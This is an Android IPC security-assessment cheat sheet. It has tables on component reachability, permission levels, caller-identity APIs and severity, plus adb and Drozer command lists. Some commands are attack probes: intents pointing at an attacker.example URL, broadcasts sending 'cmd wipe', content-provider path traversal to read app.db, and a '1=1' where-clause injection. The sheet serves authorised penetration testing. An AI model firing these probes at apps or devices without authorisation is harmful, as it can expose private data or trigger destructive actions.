# 24 — IPC Cheat Sheet

## Mechanism reachability

| Mechanism | Reachable by | Needs permission? | Visible in manifest? |
|---|---|---|---|
| Exported Activity / Service / Receiver | Any app | No | Yes |
| Exported ContentProvider | Any app | No | Yes |
| Bound AIDL / Messenger service | Any app that can bind | No | Via host service |
| Abstract UNIX socket (`@name`) | **Every app** | **No** | **No** |
| Filesystem UNIX socket | Whoever DAC/SELinux allows | No | No |
| Localhost TCP (`127.0.0.1`) | Any app | `INTERNET` (auto-granted) | No |
| TCP on `0.0.0.0` | Any app + local network | `INTERNET` | No |
| External-storage file | Storage/MediaStore holders | Varies | No |
| Shared memory (ashmem/memfd) | Whoever holds the fd | No | No |
| Clipboard | Foreground app (API 29+) | No | No |
| `Settings.Secure` / `Global` read | Almost any app | No | No |
| Broadcast without receiver permission | Every app | No | Sender-side only |

## Permission protection levels

| Level | Granted to | Real control? |
|---|---|---|
| `normal` | Any app that asks, at install, silently | **No** |
| `dangerous` | User prompt at runtime | Weak — a malicious app will just ask |
| `signature` | Same signing certificate only | **Yes** |
| `signatureOrSystem` / `privileged` | Same cert or system partition | Yes |

## Identity APIs

| API | Trustworthy | Use for |
|---|---|---|
| `Binder.getCallingUid()` | Yes (kernel-supplied) | Authorisation |
| `Binder.getCallingUidOrThrow()` | Yes | Authorisation (safer) |
| `Binder.getCallingPid()` | Racy (PID reuse) | Logging only |
| `ContentProvider.getCallingPackage()` | Yes, with shared-UID caveat | Authorisation |
| `Activity.getCallingPackage()` | Only after `startActivityForResult` | Weak signal |
| `Message.sendingUid` | Yes (API 21+) | Authorisation |
| `SO_PEERCRED` uid | Yes | Authorisation |
| `SO_PEERCRED` pid | Racy | Logging only |
| An extra the caller supplied | **No** | Nothing |

## `clearCallingIdentity` — the four bugs

| # | Pattern | Fix |
|---|---|---|
| 1 | Clear before the permission check | Check with the real identity first |
| 2 | Cleared window too wide | Clear only around the privileged step |
| 3 | No `finally` around restore | Always `try { } finally { restore }` |
| 4 | Mismatched / non-LIFO restore | One token, one restore, strictly nested |

## Live enumeration

```bash
# adb shell
PKG=com.example.app; PID=$(pidof -s $PKG)
dumpsys package $PKG                    # components, exported flags, permissions, uid
service list                            # registered binder services
cat /proc/net/unix | grep '@'           # ABSTRACT sockets — world reachable
cat /proc/net/tcp                       # st==0A means LISTEN; local_address is hex LE
netstat -tulpn                          # easier form, may lack process attribution
ls -l /proc/$PID/fd                     # sockets, dbs, pipes, ashmem
grep -E "ashmem|memfd" /proc/$PID/maps  # shared memory
ls -laZ /data/data/$PKG                 # file modes + SELinux labels (root)
dumpsys activity broadcasts             # broadcast history
pm get-app-links $PKG                   # App Links verification state
```

## Decoding /proc/net/tcp

| Field | Meaning |
|---|---|
| `local_address` | `IP:PORT`, IP in **little-endian hex**. `0100007F` = 127.0.0.1 |
| `st` | `0A` = LISTEN, `01` = ESTABLISHED |
| `uid` | Owning UID → `cmd package list packages --uid <uid>` |
| `inode` | Match against `ls -l /proc/<pid>/fd` `socket:[inode]` |

## Exercising components

```bash
# adb shell
am start   -n <pkg>/<cls> --es url "https://attacker.example/"
am start   -a android.intent.action.VIEW -d "scheme://host/path?k=v"
am start   -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d "<uri>"
am broadcast -a <ACTION> -n <pkg>/<recv> --es cmd wipe
am start-service -n <pkg>/<svc>
content query  --uri content://<auth>/<path>
content query  --uri content://<auth>/<path> --where "1=1"
content call   --uri content://<auth> --method <m> --arg <a>
content read   --uri content://<auth>/files/../../databases/app.db
cmd package resolve-activity --brief -a android.intent.action.VIEW -d "<uri>"
```

### `am` extra types

| Flag | Type | Flag | Type |
|---|---|---|---|
| `--es` | String | `--ei` | int |
| `--esn` | null String | `--el` | long |
| `--ez` | boolean | `--ef` | float |
| `--eu` | Uri | `--ecn` | ComponentName |
| `--esa` | String[] | `--eia` | int[] |
| `-f 0x...` | flags | `--grant-read-uri-permission` | grant flag |

## Drozer

```text
run app.package.attacksurface <pkg>
run app.activity.info -a <pkg>
run app.activity.start --component <pkg> <cls> --extra string url https://attacker.example/
run app.service.info -a <pkg>
run app.service.send <pkg> <cls> --msg 1 0 0 --extra string k v --bundle-as-obj
run app.broadcast.info -a <pkg>
run app.broadcast.send --component <pkg> <recv> --extra string cmd wipe
run app.broadcast.sniff --action <ACTION>
run app.provider.info -a <pkg>
run app.provider.finduri <pkg>
run app.provider.query content://<auth>/<path>
run app.provider.read  content://<auth>/files/../../databases/app.db
run scanner.provider.injection -a <pkg>
run scanner.provider.traversal -a <pkg>
run scanner.provider.sqltables -a <pkg>
run scanner.provider.finduris
```

## Static grep corpus

```bash
grep -rn "LocalServerSocket\|LocalSocketAddress\|Namespace.ABSTRACT" out/sources/
grep -rnE "new ServerSocket\(|NanoHTTPD|ServerSocketChannel" out/sources/
grep -rn "MODE_WORLD_READABLE\|MODE_WORLD_WRITEABLE\|setReadable(true, *false)" out/sources/
grep -rn "MemoryFile\|SharedMemory\|ashmem\|memfd" out/sources/
grep -rn "ClipboardManager\|setPrimaryClip" out/sources/
grep -rn "clearCallingIdentity\|getCallingUid\|getCallingPid" out/sources/
grep -rn "sendBroadcast\|sendStickyBroadcast\|sendOrderedBroadcast" out/sources/
grep -rn "PendingIntent.get\|FLAG_MUTABLE" out/sources/
# Intent redirection: files in BOTH lists
grep -rl "getParcelableExtra" out/sources/ | sort > /tmp/a
grep -rlE "startActivity|startService|bindService|sendBroadcast" out/sources/ | sort > /tmp/b
comm -12 /tmp/a /tmp/b
```

## Smali signatures

| Pattern | Meaning |
|---|---|
| `getParcelableExtra` → `check-cast Landroid/content/Intent;` → `startActivity` | Intent redirection |
| `Landroid/net/LocalServerSocket;-><init>(Ljava/lang/String;)V` | Abstract socket |
| `Ljava/net/ServerSocket;-><init>(I)V` | Listening on all interfaces |
| `Binder;->clearCallingIdentity()J` with no `:catchall` | Missing `finally` |
| `DESCRIPTOR` + `TRANSACTION_*` constants + `onTransact` switch | AIDL Stub — reconstruct the interface |

## PendingIntent flag values seen in decompiled code

| Decimal | Hex | Constant |
|---|---|---|
| 33554432 | `0x02000000` | `FLAG_MUTABLE` |
| 67108864 | `0x04000000` | `FLAG_IMMUTABLE` |
| 134217728 | `0x08000000` | `FLAG_UPDATE_CURRENT` |
| 268435456 | `0x10000000` | `FLAG_CANCEL_CURRENT` |
| 536870912 | `0x20000000` | `FLAG_NO_CREATE` |
| 1073741824 | `0x40000000` | `FLAG_ONE_SHOT` |

## Version gates that change the verdict

| API | Gate |
|---|---|
| 17 | Provider `exported` default becomes `false` |
| 21 | `bindService` must be explicit; `Message.sendingUid` |
| 24 | `MODE_WORLD_*` throws; `file://` exposure throws |
| 26 | Implicit broadcasts mostly cannot start manifest receivers |
| 29 | Clipboard restricted to foreground; scoped storage |
| 30 | `<queries>` package-visibility filtering |
| 31 | `exported` mandatory; `PendingIntent` mutability mandatory |
| 33 | `registerReceiver` export flag mandatory |
| 34 | Implicit intents cannot target non-exported components |

## Severity guide

| Situation | Severity |
|---|---|
| Auth material or PII readable by any app | Critical |
| Arbitrary file read/write in the app sandbox | Critical |
| Redirection reaching internal WebView or a private provider grant | High |
| Privileged AIDL method callable by any app | High |
| State change without user confirmation | High |
| Secrets in a global broadcast | High |
| Abstract socket exposing only benign data | Low |
| Redirection reaching only already-exported components | **Not a finding** |
| Reproducible only from `adb shell` or root | **Not an app finding** |

## The discipline

1. Record `targetSdk`, `minSdk`, device fingerprint, security patch level.
2. Inventory the manifest, including permission **protection levels**.
3. Grep for the channels the manifest cannot show.
4. Enumerate live: `/proc/net/unix`, `/proc/net/tcp`, `/proc/<pid>/fd`.
5. Reproduce from Drozer or a real attacker APK — never only `adb shell`.
6. Walk the reach-through: what does the door actually lead to?
7. Assign severity honestly, and document what you ruled out.
